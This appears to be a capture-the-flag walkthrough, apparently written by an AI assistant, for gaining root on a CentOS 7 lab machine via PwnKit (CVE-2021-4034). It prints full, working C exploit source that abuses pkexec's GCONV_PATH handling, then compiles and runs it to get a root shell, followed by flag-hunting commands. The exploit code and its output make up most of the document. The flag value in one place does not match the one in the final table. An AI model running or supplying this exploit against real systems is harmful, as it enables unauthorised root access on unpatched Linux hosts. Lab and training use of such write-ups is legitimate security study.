# 🛠️ PwnKit (CVE-2021-4034) Privilege Escalation Walkthrough

Target: **CentOS 7 / RHEL 7 – Kernel 3.10.0-1160.el7.x86_64**

---

## 🔍 Step 1 — Basic Enumeration

First, identify OS + kernel:

```bash
hostname
uname -a
cat /proc/version
cat /etc/issue
```

Output (summary):

* **CentOS 7 / RedHat**
* Kernel: **3.10.0-1160 (2020)**
* GCC version: **4.8.5**
* Vulnerable to **PwnKit (CVE-2021-4034)**

✔ pkexec exists on all RHEL7 systems → exploit works.

---

## ⚙️ Step 2 — Create the PwnKit Exploit

You created the exploit file:

```bash
nano exp.c
```

And used the following code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n\n"
    "void gconv() {}\n"
    "void gconv_init() {\n"
    "   setuid(0); setgid(0);\n"
    "   seteuid(0); setegid(0);\n"
    "   system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
    "   exit(0);\n"
    "}";

int main(int argc, char *argv[]) {
    FILE *fp;
    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
    fp = fopen("pwnkit/pwnkit.c", "w");
    fprintf(fp, "%s", shell);
    fclose(fp);
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
    execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

---

## 🧱 Step 3 — Compile the Exploit

Compile:

```bash
gcc exp.c -o exp
ls
```

Files created:

```
exp
exp.c
perl5
```

---

## 🚀 Step 4 — Run the Exploit

Execute:

```bash
./exp
```

Immediate root shell:

```
sh-4.2# id
uid=0(root) gid=0(root)
sh-4.2# whoami
root
```

✔ **Root obtained successfully**
✔ SELinux context: unconfined → no blocking

---

# 🏴‍☠️ Step 5 — Capture the Flags

### Flag in `/home/rootflag`:

```bash
cd /home/rootflag
ls
cat flag2.txt
```

Output:

```
THM-1688247823xxxx
```

---

### Search for more flags:

```bash
find /root /home /opt /var /tmp /etc -type f \
    \( -name "flag*" -o -name "*flag*" -o -name "flag1.txt" \) \
    2>/dev/null
```

Found:

```
/home/missy/Documents/flag1.txt
/home/rootflag/flag2.txt
```

Read flag1:

```bash
cat /home/missy/Documents/flag1.txt
```

Output:

```
THM-4282871992xxxx
```

---

# 🎯 Final Results

| Location                          | Flag                    |
| --------------------------------- | ----------------------- |
| `/home/missy/Documents/flag1.txt` | **THM-4282871992xxxx**  |
| `/home/rootflag/flag2.txt`        | **THM-16882478239xxxx** |

✔ Root access achieved
✔ Both flags collected
✔ Exploit: **CVE-2021-4034 (PwnKit)**
✔ Method: pkexec GCONV loader injection
✔ PrivEsc success on **CentOS 7 kernel 3.10.0**

---

If you want, I can generate this as:

📄 **Markdown (.md)**
📘 **PDF**
📗 **DOCX**
🎨 **Colored README.md (GitHub style)**

Just tell me which format you prefer.
